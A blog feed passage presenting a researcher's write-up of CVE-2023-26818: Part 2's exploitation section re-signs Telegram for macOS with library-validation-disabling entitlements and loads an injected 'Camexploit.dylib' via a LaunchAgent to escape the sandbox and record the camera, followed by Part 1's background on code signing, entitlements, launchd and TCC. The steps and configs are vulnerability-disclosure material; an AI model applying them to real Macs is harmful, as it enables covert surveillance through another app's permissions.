&lt;p&gt;These mark the end of the dictionary data structure and the end of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;plist&lt;/code&gt; content.&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;h2 id=&quot;sandbox-bypass&quot;&gt;&lt;strong&gt;Sandbox Bypass&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;After going through dozens of resources non-mentioned the root-cause or the reason why the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;launch agent&lt;/code&gt; can bypass the&lt;/p&gt;

&lt;p&gt;sandbox. But, I found 2 reasons that are closer to being true and one of them makes more sense:&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;When the app runs through &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;launchd&lt;/code&gt; then it’s managed by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;launchd&lt;/code&gt; and works under it, As a result, it bypasses the sandbox.&lt;/p&gt;

    &lt;p&gt; &lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;When a malicious code such as a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DyLib&lt;/code&gt; gets loaded with the program in the agent, It leads the library to act the same way&lt;/p&gt;

    &lt;p&gt; &lt;/p&gt;

    &lt;p&gt;as the program. Then it will be able to obtain the same permissions as the running app which makes it bypass the sandbox.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;I see the second reason as more logical. Because &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;launchd&lt;/code&gt; implementation has these thoughts to make sure the app is running as it&lt;/p&gt;

&lt;p&gt;has to. Now, After we made almost everything clear, We can start to exploit the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CVE-2023-26818&lt;/code&gt; while the sandbox is&lt;/p&gt;

&lt;p&gt;activated.&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;h1 id=&quot;exploitation&quot;&gt;&lt;strong&gt;Exploitation&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;What we need now is to reassign the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Entitlements&lt;/code&gt; to telegram and set the sandbox to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;true&lt;/code&gt;, In the first part, we explained&lt;/p&gt;

&lt;p&gt;how to do tho, but we will show it again with the changes (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Only the signing part&lt;/code&gt;). The following are the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Entitlements&lt;/code&gt; we&lt;/p&gt;

&lt;p&gt;need:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;
&amp;lt;!DOCTYPE plist PUBLIC &quot;-//Apple//DTD PLIST 1.0//EN&quot; &quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;&amp;gt;
&amp;lt;plist version=&quot;1.0&quot;&amp;gt;
&amp;lt;dict&amp;gt;
    &amp;lt;key&amp;gt;com.apple.security.app-sandbox&amp;lt;/key&amp;gt;
    &amp;lt;true/&amp;gt;
    &amp;lt;key&amp;gt;com.apple.security.application-groups&amp;lt;/key&amp;gt;
    &amp;lt;array&amp;gt;
        &amp;lt;string&amp;gt;6N38VWS5BX.ru.keepcoder.Telegram&amp;lt;/string&amp;gt;
        &amp;lt;string&amp;gt;6N38VWS5BX.ru.keepcoder.Telegram.TelegramShare&amp;lt;/string&amp;gt;
    &amp;lt;/array&amp;gt;
    &amp;lt;key&amp;gt;com.apple.security.cs.allow-dyld-environment-variables&amp;lt;/key&amp;gt;
    &amp;lt;true/&amp;gt;
    &amp;lt;key&amp;gt;com.apple.security.cs.disable-library-validation&amp;lt;/key&amp;gt;
    &amp;lt;true/&amp;gt;
    &amp;lt;key&amp;gt;com.apple.security.device.audio-input&amp;lt;/key&amp;gt;
    &amp;lt;true/&amp;gt;
    &amp;lt;key&amp;gt;com.apple.security.device.camera&amp;lt;/key&amp;gt;
    &amp;lt;true/&amp;gt;
    &amp;lt;key&amp;gt;com.apple.security.personal-information.location&amp;lt;/key&amp;gt;
    &amp;lt;true/&amp;gt;
&amp;lt;/dict&amp;gt;
&amp;lt;/plist&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;Let’s remove &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;telegram&lt;/code&gt; app signing:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;codesign --remove-signature --no-strict /Applications/Telegram.app
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;Now, Let’s sign it using our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Entitlements&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;codesign --force --deep --sign &quot;Developer ID&quot; --entitlements entit.plist /Applications/Telegram.app
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;Finally, Let’s take a look at the signing information:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;codesign -dv --entitlements - /Applications/Telegram.app
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/e9326812e03e6546697d96f8cdbec4b8&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;We can see clearly that the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sandbox&lt;/code&gt; is activated and if we open the activity monitor app we can see it clearly as the following:&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/6291fb4d72ee945334b604da3fa56ea6&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;Now, Oppiste to the exploitation way we did in the first part without the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sandbox&lt;/code&gt;, We are going to use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Launch Agent&lt;/code&gt; to&lt;/p&gt;

&lt;p&gt;do tho, So we can bypass the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sandbox&lt;/code&gt;. Here is the agent &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;plist&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;
&amp;lt;!DOCTYPE plist PUBLIC &quot;-//Apple//DTD PLIST 1.0//EN&quot; &quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;&amp;gt;
&amp;lt;plist version=&quot;1.0&quot;&amp;gt;
&amp;lt;dict&amp;gt;
       &amp;lt;key&amp;gt;Label&amp;lt;/key&amp;gt;
        &amp;lt;string&amp;gt;com.telegram.launcher&amp;lt;/string&amp;gt;
        &amp;lt;key&amp;gt;RunAtLoad&amp;lt;/key&amp;gt;
        &amp;lt;true/&amp;gt;
        &amp;lt;key&amp;gt;EnvironmentVariables&amp;lt;/key&amp;gt;
        &amp;lt;dict&amp;gt;
          &amp;lt;key&amp;gt;DYLD_INSERT_LIBRARIES&amp;lt;/key&amp;gt;
          &amp;lt;string&amp;gt;/Users/labatrixteam/telegram/Camexploit.dylib&amp;lt;/string&amp;gt;
        &amp;lt;/dict&amp;gt;
        &amp;lt;key&amp;gt;ProgramArguments&amp;lt;/key&amp;gt;
        &amp;lt;array&amp;gt;
  &amp;lt;string&amp;gt;/Applications/Telegram.app/Contents/MacOS/Telegram&amp;lt;/string&amp;gt;
        &amp;lt;/array&amp;gt;
        &amp;lt;key&amp;gt;StandardOutPath&amp;lt;/key&amp;gt;
        &amp;lt;string&amp;gt;/tmp/telegram.log&amp;lt;/string&amp;gt;
        &amp;lt;key&amp;gt;StandardErrorPath&amp;lt;/key&amp;gt;
        &amp;lt;string&amp;gt;/tmp/telegram.log&amp;lt;/string&amp;gt;
&amp;lt;/dict&amp;gt;
&amp;lt;/plist&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;The explanation for the essential keys is as we explained before in the previous example, But we gonna explain the simple&lt;/p&gt;

&lt;p&gt;differences:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;key&amp;gt;RunAtLoad&amp;lt;/key&amp;gt;
&amp;lt;true/&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;Specifies that the program associated with this agent should be executed as soon as the agent is loaded.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;key&amp;gt;EnvironmentVariables&amp;lt;/key&amp;gt;
&amp;lt;dict&amp;gt;
    &amp;lt;key&amp;gt;DYLD_INSERT_LIBRARIES&amp;lt;/key&amp;gt;
    &amp;lt;string&amp;gt;/Users/labatrixteam/telegram/Camexploit.dylib&amp;lt;/string&amp;gt;
&amp;lt;/dict&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;This section sets an environment variable &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DYLD_INSERT_LIBRARIES&lt;/code&gt; for the agent which specific environment variable for&lt;/p&gt;

&lt;p&gt;dynamic libraries to be loaded before any others which instructs the system to load the&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/Users/labatrixteam/telegram/Camexploit.dylib&lt;/code&gt; library when launching &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Telegram&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;key&amp;gt;ProgramArguments&amp;lt;/key&amp;gt;
&amp;lt;array&amp;gt;
    &amp;lt;string&amp;gt;/Applications/Telegram.app/Contents/MacOS/Telegram&amp;lt;/string&amp;gt;
&amp;lt;/array&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;it’s set to run the main executable for the Telegram application.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;key&amp;gt;StandardOutPath&amp;lt;/key&amp;gt;
&amp;lt;string&amp;gt;/tmp/telegram.log&amp;lt;/string&amp;gt;
&amp;lt;key&amp;gt;StandardErrorPath&amp;lt;/key&amp;gt;
&amp;lt;string&amp;gt;/tmp/telegram.log&amp;lt;/string&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;specify where the standard output and standard error streams of the agent should be directed. Now, Let’s run telegram without&lt;/p&gt;

&lt;p&gt;our agent and see what will happen and then save our agent and load it using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;launchctl&lt;/code&gt; to see how the sandbox will be bypassed:&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;W/o &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Launch Agent&lt;/code&gt;:&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;DYLD_INSERT_LIBRARIES=Camexploit.dylib /Applications/Telegram.app/Contents/MacOS/Telegram
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/290259ae00b8457cc4e23d54aadca324&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;Here we can see it fails because of the sandbox. Now, Let’s give it a shot with our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Launch Agent&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;W/ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Launch Agent&lt;/code&gt;:&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo launchctl bootstrap gui/$(id -u) ~/Library/LaunchAgents/com.telegram.launcher.plist
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/13385289547e27a28c1f507efe3fbabd&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;We can see that it’s recorded successfully and the recorded video path is in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;log&lt;/code&gt; file we identified for the output.&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;h1 id=&quot;conclusion&quot;&gt;&lt;strong&gt;Conclusion&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;In part 2 we were able to discuss and understand more about &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;launchd&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sandbox&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Powerbox API&lt;/code&gt; and many more. We saw how the&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sandbox&lt;/code&gt; on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;macOS&lt;/code&gt; can be bypassed using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Launch Agent&lt;/code&gt; &amp;amp; Show 2 theoretical reasons why this could lead to the bypass.&lt;/p&gt;

&lt;p&gt;Finally, We may come up with a blog explaining the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sandbox&lt;/code&gt; more deeply by reversing &amp;amp; debugging it and exploring more of the&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MocOS&lt;/code&gt; system internal to see how all of this happens in action and approve the 100% reason of why the bypass happen.&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;h1 id=&quot;resources&quot;&gt;&lt;strong&gt;Resources&lt;/strong&gt;&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/&lt;/p&gt;

    &lt;p&gt; &lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;https://lapcatsoftware.com/articles/sandbox-escape.html&lt;/p&gt;

    &lt;p&gt; &lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;a href=&quot;https://web.archive.org/web/20170412191246mp_/https://developer.apple.com/library/content/documentation/Security/Conceptual/AppSandboxDesignGuide/AboutAppSandbox/AboutAppSandbox.html#//apple_ref/doc/uid/TP40011183-CH1-SW1&quot;&gt;https://web.archive.org/web/20170412191246mp_/https://developer.apple.com/library/content/documentation/Security/Conceptual/AppSandboxDesignGuide/AboutAppSandbox/AboutAppSandbox.html#//apple_ref/doc/uid/TP40011183-CH1-SW1&lt;/a&gt;&lt;/p&gt;

    &lt;p&gt; &lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;https://www.cnet.com/tech/computing/what-apples-sandboxing-means-for-developers-and-users/&lt;/p&gt;

    &lt;p&gt; &lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;https://www.maketecheasier.com/how-macos-app-sandboxing-protects-users/&lt;/p&gt;

    &lt;p&gt; &lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;https://www.karltarvas.com/macos-app-sandboxing-via-sandbox-exec.html&lt;/p&gt;

    &lt;p&gt; &lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;https://www.quora.com/How-does-the-app-sandbox-architecture-work-in-macOS&lt;/p&gt;

    &lt;p&gt; &lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;a href=&quot;https://book.hacktricks.xyz/macos-hardening/macos-security-and-privilege-escalation/macos-security-protections/macos-sandbox&quot;&gt;https://book.hacktricks.xyz/macos-hardening/macos-security-and-privilege-escalation/macos-security-protections/macos-sandbox#&lt;/a&gt;&lt;/p&gt;

    &lt;p&gt; &lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;https://desi-jarvis.medium.com/office365-macos-sandbox-escape-fcce4fa4123c&lt;/p&gt;

    &lt;p&gt; &lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;https://book.hacktricks.xyz/macos-hardening/macos-security-and-privilege-escalation/macos-security-protections/macos-sandbox/macos-sandbox-debug-and-bypass&lt;/p&gt;

    &lt;p&gt; &lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;https://newosxbook.com/files/HITSB.pdf&lt;/p&gt;

    &lt;p&gt; &lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;https://www.youtube.com/watch?v=mG715HcDgO8&lt;/p&gt;

    &lt;p&gt; &lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;a href=&quot;https://conference.hitb.org/hitbsecconf2021ams/materials/D1T1%20-%20MacOS%20Local%20Security%20-%20Escaping%20the%20Sandbox%20and%20Bypassing%20TCC%20-%20Thijs%20Alkemade%20&amp;amp;%20Daan%20Keuper.pdf&quot;&gt;https://conference.hitb.org/hitbsecconf2021ams/materials/D1T1 - MacOS Local Security - Escaping the Sandbox and Bypassing TCC - Thijs Alkemade &amp;amp; Daan Keuper.pdf&lt;/a&gt;&lt;/p&gt;

    &lt;p&gt; &lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;https://www.mdsec.co.uk/2018/08/escaping-the-sandbox-microsoft-office-on-macos/&lt;/p&gt;

    &lt;p&gt; &lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;https://nakedsecurity.sophos.com/2011/11/14/apples-os-x-sandbox-has-a-gaping-hole-or-not/&lt;/p&gt;

    &lt;p&gt; &lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;https://www.computerworld.com/article/2734310/researchers-bypass-the-restrictions-of-mac-os-x-default-sandbox-profiles.html&lt;/p&gt;

    &lt;p&gt; &lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;https://www.youtube.com/watch?v=vMGiplQtjTY&lt;/p&gt;

    &lt;p&gt; &lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;https://www.appcoda.com/mac-app-sandbox/&lt;/p&gt;

    &lt;p&gt; &lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;a href=&quot;https://wiki.freepascal.org/Sandboxing_for_macOS&quot;&gt;https://wiki.freepascal.org/Sandboxing_for_macOS&lt;/a&gt;&lt;/p&gt;

    &lt;p&gt; &lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;https://www.macwelt.de/article/959302/festung-mac-teil-i.html&lt;/p&gt;

    &lt;p&gt; &lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;https://github.com/saagarjha/macOSSandboxInitializationBypass&lt;/p&gt;

    &lt;p&gt; &lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;a href=&quot;https://developer.apple.com/documentation/security/app_sandbox&quot;&gt;https://developer.apple.com/documentation/security/app_sandbox&lt;/a&gt;&lt;/p&gt;

    &lt;p&gt; &lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;https://www.manpagez.com/man/7/sandbox/&lt;/p&gt;

    &lt;p&gt; &lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;https://medium.com/@boutnaru/the-macos-process-journey-sandboxd-sandbox-daemon-17c8c0efe8c9&lt;/p&gt;

    &lt;p&gt; &lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;https://developer.apple.com/documentation/xcode/configuring-the-macos-app-sandbox&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;</content><author><name>Zeyad Azima</name></author><summary type="html">Introduction</summary></entry><entry><title type="html">CVE-2023-26818 Part1: MacOS TCC Bypass with telegram using DyLib Injection</title><link href="http://localhost:5000/macos/CVE_2023_26818_P1/" rel="alternate" type="text/html" title="CVE-2023-26818 Part1: MacOS TCC Bypass with telegram using DyLib Injection" /><published>2023-08-01T00:00:00+08:00</published><updated>2023-08-01T00:00:00+08:00</updated><id>http://localhost:5000/macos/CVE_2023_26818_P1</id><content type="html" xml:base="http://localhost:5000/macos/CVE_2023_26818_P1/">&lt;h1 id=&quot;introduction&quot;&gt;&lt;strong&gt;Introduction&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;A vulnerability Discovered in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Telegram&lt;/code&gt; for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MacOS&lt;/code&gt; assigned as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CVE-2023-26818&lt;/code&gt; leads to a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TCC&lt;/code&gt; (Transparency, Consent, and&lt;/p&gt;

&lt;p&gt;Control) bypass through a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DyLib&lt;/code&gt; Injection using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DYLD_INSERT_LIBRARIES&lt;/code&gt; environment variable along with bypass&lt;/p&gt;

&lt;p&gt;the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SandBox&lt;/code&gt; using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LaunchAgent&lt;/code&gt;. A successful exploitation of this vulnerability will lead to a local privilege escalation by&lt;/p&gt;

&lt;p&gt;getting access to the camera through previously granted permissions to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Telegram&lt;/code&gt;.&lt;/p&gt;

&lt;h1 id=&quot;essentials&quot;&gt;Essentials&lt;/h1&gt;
&lt;h2 id=&quot;code-signing&quot;&gt;&lt;strong&gt;Code Signing&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Code Signing&lt;/code&gt; is a security technology used to sign/certify your app unique so the system can verify if any changes made to&lt;/p&gt;

&lt;p&gt;the app is by the original owner or by malicious activity. Also, It helps prevent the loading of crafted or malicious&lt;/p&gt;

&lt;p&gt;components to your app as these components are not signed by the owner.&lt;/p&gt;

&lt;h2 id=&quot;entitlements&quot;&gt;&lt;strong&gt;Entitlements&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Entitlements&lt;/code&gt; refers to security permissions that you give to your app either on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IOS&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MacOS&lt;/code&gt; and It’s in a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Key-Value&lt;/code&gt; form.&lt;/p&gt;

&lt;p&gt;For example: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;com.apple.developer.authentication-services.autofill-credential-provider&lt;/code&gt; which is an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Entitlement&lt;/code&gt; that used to provide&lt;/p&gt;

&lt;p&gt;user names and passwords for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AutoFill&lt;/code&gt; in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Safari&lt;/code&gt; and other apps &amp;amp; It has a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;boolen&lt;/code&gt; type to define whether the app may do&lt;/p&gt;

&lt;p&gt;the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AutoFill&lt;/code&gt; or no. Another example &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;com.apple.developer.location.push&lt;/code&gt; which allows enabling a location-sharing app to query&lt;/p&gt;

&lt;p&gt;someone’s location in response to a push notification. And the same applies to others like accessing physical devices such&lt;/p&gt;

&lt;p&gt;as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Camera&lt;/code&gt;.&lt;/p&gt;

&lt;h2 id=&quot;hardened-runtime&quot;&gt;&lt;strong&gt;Hardened Runtime&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Hardened Runtime&lt;/code&gt; is a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MacOS&lt;/code&gt; app security protection and resources access used to protect and prevent certain exploits&lt;/p&gt;

&lt;p&gt;against your app which is as the following: (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;code injection&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dynamically linked library (DLL) hijacking&lt;/code&gt;, and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;process memory space tampering&lt;/code&gt;).&lt;/p&gt;

&lt;h2 id=&quot;launch-agent&quot;&gt;&lt;strong&gt;Launch Agent&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;A &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Launch Agent&lt;/code&gt; is a mechanism used to manage and schedule the execution of background tasks or processes on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MacOS&lt;/code&gt; &amp;amp; It’s a&lt;/p&gt;

&lt;p&gt;part of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Launchd&lt;/code&gt; which is responsible for starting, stopping, and managing processes at various stages of the system’s startup&lt;/p&gt;

&lt;p&gt;and operation. The daemons and agents managed by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;launchd&lt;/code&gt; by looking at the configuration files in the following folders:&lt;/p&gt;

&lt;p&gt;Folders&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/System/Library/LaunchDaemons&lt;/code&gt; for Apple-supplied system daemons&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/System/Library/LaunchAgents&lt;/code&gt; for Apple-supplied agents&lt;/p&gt;

&lt;p&gt;that apply to all users on a per-user basis&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/Library/LaunchDaemons&lt;/code&gt; for Third-party system daemons&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/Library/LaunchAgents&lt;/code&gt; for Third-&lt;/p&gt;

&lt;p&gt;party agents that apply to all users on a per-user basis&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;~/Library/LaunchAgents&lt;/code&gt; for Third-party agents that apply only to the&lt;/p&gt;

&lt;p&gt;logged-in user&lt;/p&gt;

&lt;h2 id=&quot;tcc&quot;&gt;&lt;strong&gt;TCC&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;TCC (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Transparency, Consent, and Control&lt;/code&gt;) is a security feature in macOS that regulates access to sensitive user data/parts by&lt;/p&gt;

&lt;p&gt;applications with managing application access to various protected resources, such as the camera, microphone, contacts,&lt;/p&gt;

&lt;p&gt;calendar, location, and more. When an application attempts to access one of these resources, TCC checks if the application has&lt;/p&gt;

&lt;p&gt;been granted permission by the user. If permission has not been granted, the application is denied access to the resource.&lt;/p&gt;

